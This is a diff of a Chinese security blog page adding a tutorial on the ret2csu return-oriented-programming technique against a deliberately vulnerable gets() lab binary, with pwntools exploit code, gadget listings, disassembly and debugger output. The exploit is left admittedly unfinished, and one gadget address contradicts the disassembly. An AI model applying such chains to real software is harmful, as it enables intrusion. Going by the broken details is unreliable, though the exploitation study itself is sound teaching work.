@@ -13,10 +13,10 @@
     <meta property="og:title" content="ret2csu - 诚安">
     <meta property="og:type" content="article">
         
-    <meta property="article:published_time" content='2021-05-24T00:00:00&#43;08:00'>
+    <meta property="article:published_time" content='2023-02-19T00:00:00&#43;08:00'>
         
         
-    <meta property="article:modified_time" content='2021-05-24T00:00:00&#43;08:00'>
+    <meta property="article:modified_time" content='2023-02-19T00:00:00&#43;08:00'>
         
     <meta name="Keywords" content="信息安全、主机安全、网络安全、二进制、数据安全">
     <meta name="description" content="ret2csu">
@@ -140,7 +140,19 @@
 <div class="post-toc" style="position: absolute; top: 188px;">
     <h2 class="post-toc-title">文章目录</h2>
     <div class="post-toc-content">
-        <nav id="TableOfContents"></nav>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#漏洞程序">漏洞程序</a></li>
+    <li><a href="#利用分析">利用分析</a></li>
+    <li><a href="#常规利用">常规利用</a></li>
+    <li><a href="#ret2csu">ret2csu</a></li>
+    <li><a href="#pwn">pwn</a>
+      <ul>
+        <li><a href="#参考">参考</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
     </div>
 </div>
 <script type="text/javascript">
@@ -179,7 +191,7 @@
             <h1 class="post-title">ret2csu</h1>
         </header>
         <date class="post-meta meta-date">
-            2021年5月24日
+            2023年2月19日
         </date>
         
         <div class="post-meta">
@@ -203,7 +215,229 @@
         </div>
         
         <div class="post-content">
-            
+            <h2 id="漏洞程序">漏洞程序</h2>
+<pre tabindex="0"><code>#include &lt;stdio.h&gt;
+
+int win(int x, int y, int z) {
+    if(z == 0xdeadbeefcafed00d) {
+        puts(&#34;Awesome work!&#34;);
+    }
+}
+
+int main() {
+    puts(&#34;Come on then, ret2csu me&#34;);
+
+    char input[30];
+    gets(input);
+    return 0;
+}
+</code></pre><h2 id="利用分析">利用分析</h2>
+<h2 id="常规利用">常规利用</h2>
+<ol>
+<li>溢出控制rip指向gadget</li>
+<li>gadget负责执行win
+利用代码：</li>
+</ol>
+<pre tabindex="0"><code>from pwn import *
+
+elf = context.binary = ELF(&#39;./vuln&#39;)
+
+p = process()
+
+log.info(f&#39;win addr is : {hex(elf.sym.win)}&#39;)
+
+offset = 40
+rop = ROP(elf)
+rop.raw(offset * &#39;a&#39;)
+rop.win(0,0,0xdeadbeefcafed00d)
+
+p.recv()
+
+p.sendline(rop.chain())
+
+result = p.recvline()
+
+log.info(result)
+</code></pre><p>上述代码基于一个假设存在可以构建gadget的情况，但实际情况是
+<code>[ERROR] Could not satisfy setRegisters({'rdi': 0, 'rsi': 0, 'rdx': 16045690984503103501})</code>
+所以，缺少gadget的情况下无法成功利用。</p>
+<pre tabindex="0"><code>└─$ ROPgadget --binary ./vuln --depth 20 |grep rdx 
+0x000000000040100a : add byte ptr [rax - 0x7b], cl ; sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
+0x000000000040109a : add byte ptr [rbx + rdx - 0x48], dh ; add byte ptr [rax], al ; add byte ptr [rax], al ; test rax, rax ; je 0x4010b0 ; mov edi, 0x404020 ; jmp rax
+0x0000000000401099 : add byte ptr [rbx + rdx - 0x48], sil ; add byte ptr [rax], al ; add byte ptr [rax], al ; test rax, rax ; je 0x4010b0 ; mov edi, 0x404020 ; jmp rax
+0x000000000040100d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
+</code></pre><h2 id="ret2csu">ret2csu</h2>
+<ol>
+<li>切换利用环境
+====</li>
+</ol>
+<p>为演示漏洞原理，切换到环境：</p>
+<ul>
+<li>ubuntu 16.04</li>
+<li>gcc 5.4.0</li>
+</ul>
+<pre tabindex="0"><code># gcc --version           
+gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609
+Copyright (C) 2015 Free Software Foundation, Inc.
+This is free software; see the source for copying conditions.  There is NO
+warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+</code></pre><ol start="2">
+<li>构建gadget
+====</li>
+</ol>
+<ul>
+<li>定位__libc_csu_init</li>
+</ul>
+<pre tabindex="0"><code>[0x7f074cbf19c0]&gt; afl
+0x00400470    1 42           entry0
+0x00400440    1 6            sym.imp.__libc_start_main
+0x004004a0    4 50   -&gt; 41   sym.deregister_tm_clones
+0x004004e0    4 58   -&gt; 55   sym.register_tm_clones
+0x00400520    3 28           sym.__do_global_dtors_aux
+0x00400540    4 38   -&gt; 35   entry.init0
+0x00400610    1 2            sym.__libc_csu_fini
+0x00400614    1 9            sym._fini
+0x004005a0    4 101          sym.__libc_csu_init
+0x00400566    1 16           sym.win
+0x00400576    1 42           main
+0x00400430    1 6            sym.imp.puts
+0x00400450    1 6            sym.imp.gets
+0x00400400    3 26           sym._init
+0x00400460    1 6            sym..plt.got
+</code></pre><p>__libc_csu_init:</p>
+<pre tabindex="0"><code>[0x00400630]&gt; pdf
+            ; DATA XREF from entry0 @ 0x4004d6
+┌ 101: sym.__libc_csu_init (int64_t arg1, int64_t arg2, int64_t arg3);
+│           ; arg int64_t arg1 @ rdi
+│           ; arg int64_t arg2 @ rsi
+│           ; arg int64_t arg3 @ rdx
+│           0x00400630      4157           push r15
+│           0x00400632      4156           push r14
+│           0x00400634      4189ff         mov r15d, edi               ; arg1
+│           0x00400637      4155           push r13
+│           0x00400639      4154           push r12
+│           0x0040063b      4c8d25ce0720.  lea r12, obj.__frame_dummy_init_array_entry ; loc.__init_array_start
+│                                                                      ; 0x600e10
+│           0x00400642      55             push rbp
+│           0x00400643      488d2dce0720.  lea rbp, obj.__do_global_dtors_aux_fini_array_entry ; loc.__init_array_end
+│                                                                      ; 0x600e18 ; &#34;p\x05@&#34;
+│           0x0040064a      53             push rbx
+│           0x0040064b      4989f6         mov r14, rsi                ; arg2
+│           0x0040064e      4989d5         mov r13, rdx                ; arg3
+│           0x00400651      4c29e5         sub rbp, r12
+│           0x00400654      4883ec08       sub rsp, 8
+│           0x00400658      48c1fd03       sar rbp, 3
+│           0x0040065c      e8d7fdffff     call sym._init
+│           0x00400661      4885ed         test rbp, rbp
+│       ┌─&lt; 0x00400664      7420           je 0x400686
+│       │   0x00400666      31db           xor ebx, ebx
+│       │   0x00400668      0f1f84000000.  nop dword [rax + rax]
+│      ┌──&gt; 0x00400670      4c89ea         mov rdx, r13
+│      ╎│   0x00400673      4c89f6         mov rsi, r14
+│      ╎│   0x00400676      4489ff         mov edi, r15d
+│      ╎│   0x00400679      41ff14dc       call qword [r12 + rbx*8]
+│      ╎│   0x0040067d      4883c301       add rbx, 1
+│      ╎│   0x00400681      4839eb         cmp rbx, rbp
+│      └──&lt; 0x00400684      75ea           jne 0x400670
+│       └─&gt; 0x00400686      4883c408       add rsp, 8
+│           0x0040068a      5b             pop rbx
+│           0x0040068b      5d             pop rbp
+│           0x0040068c      415c           pop r12
+│           0x0040068e      415d           pop r13
+│           0x00400690      415e           pop r14
+│           0x00400692      415f           pop r15
+└           0x00400694      c3             ret
+</code></pre><ul>
+<li>rdx相关的gadget</li>
+</ul>
+<pre tabindex="0"><code>0x00400666      31db           xor ebx, ebx
+0x00400668      0f1f84000000.  nop dword [rax + rax]
+0x00400670      4c89ea         mov rdx, r13
+0x00400673      4c89f6         mov rsi, r14
+0x00400676      4489ff         mov edi, r15d
+0x00400679      41ff14dc       call qword [r12 + rbx*8]
+</code></pre><p>rdx_gadget = 0x4005e0</p>
+<ul>
+<li>r13相关的gadget</li>
+</ul>
+<pre tabindex="0"><code>0x0040068c      415c           pop r12
+0x0040068e      415d           pop r13
+0x00400690      415e           pop r14
+0x00400692      415f           pop r15
+0x00400694      c3             ret
+</code></pre><ul>
+<li>rw内存块</li>
+</ul>
+<pre tabindex="0"><code>[0x7fa521d849c0]&gt; dcu main
+Continue until 0x00400576 using 1 bpsize
+hit breakpoint at: 0x400576
+
+[0x00400576]&gt; dm
+0x0000000000400000 - 0x0000000000401000 * usr     4K s r-x /home/kali/exploits/ret2csu/vuln /home/kali/exploits/ret2csu/vuln ; map._home_kali_exploits_ret2csu_vuln.r_x
+0x0000000000600000 - 0x0000000000601000 - usr     4K s r-- /home/kali/exploits/ret2csu/vuln /home/kali/exploits/ret2csu/vuln ; map._home_kali_exploits_ret2csu_vuln.rw_
+0x0000000000601000 - 0x0000000000602000 - usr     4K s rw- /home/kali/exploits/ret2csu/vuln /home/kali/exploits/ret2csu/vuln ; obj._GLOBAL_OFFSET_TABLE_
+0x00007fa521b6f000 - 0x00007fa521b72000 - usr    12K s rw- unk0 unk0
+...
+
+[0x004005f0]&gt; pxq @ 0x0000000000601000
+0x00601000  0x0000000000600e28  0x00007f76ad6632e0   (.`......2f.v...
+0x00601010  0x00007f76ad642220  0x0000000000400476    &#34;d.v...v.@.....
+0x00601020  0x0000000000400486  0x00007f76ad45f1c0   ..@.......E.v...
+0x00601030  0x00000000004004a6  0x0000000000000000   ..@.............
+0x00601040  0x0000000000000000  0x0000000000000000   ................
+</code></pre><p>RW_LOC = 0x00601040</p>
+<ul>
+<li>rop链
+|rop偏移|rop内容|
+| :===: | :===: |
+| + 00 | gets(RW_LOC) |
+| + x1 | 0x0040068c == (pop r12; pop r13; pop r14; pop r15;ret) |
+| + x2 | RW_LOC |
+| + x3 |  0xdeadbeefcafed00d |
+| + x4 | 0 |
+| + x5 | 0 |
+| + x6 | 0x00400666 == (&hellip;,mov rdx,r13; mov rsi,r14; mov rdi, r15d; call qword [r12 + rbx*8]) |</li>
+</ul>
+<h2 id="pwn">pwn</h2>
+<pre tabindex="0"><code>$rax   : 0x0000000000601040  →  0x00000000004005b6  →  &lt;win+0&gt; push rbp
+$rbx   : 0x0               
+$rcx   : 0x00007ffff7f9fa80  →  0x00000000fbad2088
+$rdx   : 0xdeadbeefd00d    
+$rsp   : 0x00007fffffffe330  →  0x0000000000000000
+$rbp   : 0x6161616161616161 (&#34;aaaaaaaa&#34;?)
+$rsi   : 0x0               
+$rdi   : 0x0               
+$rip   : 0x0000000000400679  →  &lt;__libc_csu_init+73&gt; call QWORD PTR [r12+rbx*8]
+$r8    : 0x00000000006026b9  →  0x6161616161616161 (&#34;aaaaaaaa&#34;?)
+$r9    : 0x0               
+$r10   : 0x1000            
+$r11   : 0x246             
+$r12   : 0x0000000000601040  →  0x00000000004005b6  →  &lt;win+0&gt; push rbp
+$r13   : 0xdeadbeefd00d    
+$r14   : 0x0               
+$r15   : 0x0               
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
+$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
+──────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0x00007fffffffe330│+0x0000: 0x0000000000000000   ← $rsp
+0x00007fffffffe338│+0x0008: 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000000000000000
+0x00007fffffffe340│+0x0010: 0x41680a62223e4950
+0x00007fffffffe348│+0x0018: 0x41681a23655a4950
+0x00007fffffffe350│+0x0020: 0x0000000000000000
+0x00007fffffffe358│+0x0028: 0x0000000000000000
+0x00007fffffffe360│+0x0030: 0x0000000000000000
+0x00007fffffffe368│+0x0038: 0x0000000000000000
+────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
+     0x40066f &lt;__libc_csu_init+63&gt; add    BYTE PTR [rcx+rcx*4-0x16], cl
+     0x400673 &lt;__libc_csu_init+67&gt; mov    rsi, r14
+     0x400676 &lt;__libc_csu_init+70&gt; mov    edi, r15d
+ →   0x400679 &lt;__libc_csu_init+73&gt; call   QWORD PTR [r12+rbx*8]
+</code></pre><p>由于编译环境的问题，win函数始终不能正确表达逻辑，此问题暂时搁置。</p>
+<h3 id="参考">参考</h3>
+<ul>
+<li><a href="https://meowmeowxw.gitlab.io/wargame/rop-emporium/7-ret2csu/">ROP Emporium - Ret2Csu</a></li>
+</ul>
+
         </div>
 
         
@@ -224,15 +458,15 @@
     <h2>See Also</h2>
     <ul class="listing">
         
-        <li><a href="/fightsec/post/pwn_08_ret2reg/">ret2reg</a></li>
+        <li><a href="/fightsec/post/pwn_07_ret2dlresolve/">ret2dlresolve</a></li>
         
-        <li><a href="/fightsec/post/pwn_05_ret2plt/">ret2plt</a></li>
+        <li><a href="/fightsec/post/pwn_02_rop/">ROP</a></li>
         
-        <li><a href="/fightsec/post/pwn_03_got_overwrite/">利用got覆盖执行shellcode</a></li>
+        <li><a href="/fightsec/post/pwn_04_ret2libc/">ret2libc</a></li>
         
-        <li><a href="/fightsec/post/pwn_01_pwntools/">pwntools基本用法</a></li>
+        <li><a href="/fightsec/post/arm_20_grooming_ios_kernel_heap/">ios内核堆梳理</a></li>
         
-        <li><a href="/fightsec/post/p04_vul_01_overflow/">缓冲区溢出01-溢出漏洞</a></li>
+        <li><a href="/fightsec/post/arm_19_ios_kernel_heap_overflow/">ios kernel和堆溢出</a></li>
         
     </ul>
 </div>
@@ -369,6 +603,10 @@
 <ul class="widget-list">
     
     <li>
+        <a href="https://winsun.github.io/fightsec/post/pwn_09_ret2csu/" title="ret2csu">ret2csu</a>
+    </li>
+    
+    <li>
         <a href="https://winsun.github.io/fightsec/post/pwn_07_ret2dlresolve/" title="ret2dlresolve">ret2dlresolve</a>
     </li>
     
@@ -404,10 +642,6 @@
         <a href="https://winsun.github.io/fightsec/post/p04_vul_04_log4j/" title="log4j">log4j</a>
     </li>
     
-    <li>
-        <a href="https://winsun.github.io/fightsec/post/p04_vul_03_serial/" title="java反序列化漏洞">java反序列化漏洞</a>
-    </li>
-    
 </ul>
     </section>
 
@@ -435,7 +669,7 @@
     
     <li><a href="https://winsun.github.io/fightsec/categories/linux/">linux (15)</a></li>
     
-    <li><a href="https://winsun.github.io/fightsec/categories/pwn/">pwn (23)</a></li>
+    <li><a href="https://winsun.github.io/fightsec/categories/pwn/">pwn (24)</a></li>
     
     <li><a href="https://winsun.github.io/fightsec/categories/reverse/">reverse (2)</a></li>
     
